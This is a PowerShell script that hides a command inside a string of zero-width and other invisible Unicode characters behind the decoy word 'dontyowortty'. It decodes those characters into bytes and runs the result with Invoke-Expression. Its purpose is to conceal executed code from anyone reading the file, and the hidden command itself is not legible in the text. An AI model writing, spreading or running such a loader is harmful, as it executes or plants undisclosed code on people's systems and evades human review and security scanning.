# Invisible characters
$nothingCharacters = @([char]0x034F, [char]0x200B, [char]0x200C, [char]0x200D)

function Get-FilteredMessage {
  param ($message)
  ($message.ToCharArray() | Where-Object { $_ -in $nothingCharacters }) -join ''
}

function Decode-Bytes {
  param ($filteredMessage)
  $byteList = [System.Collections.Generic.List[byte]]::new()
  for ($i = 0; $i -lt $filteredMessage.Length; $i += 4) {
    if ($i + 3 -ge $filteredMessage.Length) {
      break
    }
    $value = 0
    for ($j = 0; $j -lt 4; $j++) {
      $char = $filteredMessage[$i + $j]
      if ($char -notin $nothingCharacters) {
        break
      }
      $twoBits = [Array]::IndexOf($nothingCharacters, $char)
      $value = $value -bor ($twoBits -shl (2 * $j))
    }
    $byteList.Add($value)
  }
  $byteList.ToArray()
}

function Decode-Message {
  param ($message, $encoding = [Text.Encoding]::UTF8)
  $filteredMessage = Get-FilteredMessage $message
  if (-not $filteredMessage) {
    return ""  # No encoded payload found
  }
  $decodedBytes = Decode-Bytes $filteredMessage
  try {
    $decodedString = $encoding.GetString($decodedBytes)
    Invoke-Expression $decodedString
  } catch {
    Write-Error "Decoding error: $_" -ErrorAction Stop
  }
}

$message = "dontyowortty‍‌​​‍͏​​​‌‍​‍͏‍​͏​‍​​​‌​​‍‌​‌‍‌͏‍​​​​‌‌​‌‍‌​͏​‌​‍‍‌​‍​‍​‍͏‍​‌‍‌͏‌​͏​‍‍‌​‌͏‍​​‍‌​‍͏‍​‌‍‌͏​‍͏​​​‌​‍͏‍​‍͏‍​​͏‌​‍​‌​​​‌​‌͏͏​‍‍‌​͏‌‍​​‍​​‌‌‍͏‌‌‍͏‍͏​​͏‌‌​‍‍‌​‍​‍​͏‌‌͏‌͏‌͏​‌​​‍‍‌​​​‍​‌͏‍​͏͏‌͏​‍‌​​​‌​‍͏
‍​‍͏‍​​͏‌​‍​‌​​​‌​͏͏‌͏͏‌‌​​​‌​‌͏‍​​​‌​‌͏‌͏​‌‌"
Decode-Message $message
